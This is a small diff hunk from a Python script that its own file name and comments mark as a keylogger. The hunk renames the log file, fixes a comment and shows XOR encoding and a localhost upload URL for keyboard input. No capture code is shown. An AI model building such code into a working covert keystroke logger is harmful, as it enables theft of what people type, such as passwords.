@@ -6,10 +6,10 @@ from Xor_2 import xor_on_key
 my_json = []
 
 dicti = {}                                          #A dictionary for saving input from the keyboard.
-//my_json = {}
+# my_json = {}
 str_for_show = ''
 
-filename = r"C:\my_python\+\file_for_kelogger.txt"
+filename = r"C:\my_python\kodcod1\saveData.json"
 
 url = f"http://127.0.0.1:5000/save_data"
 
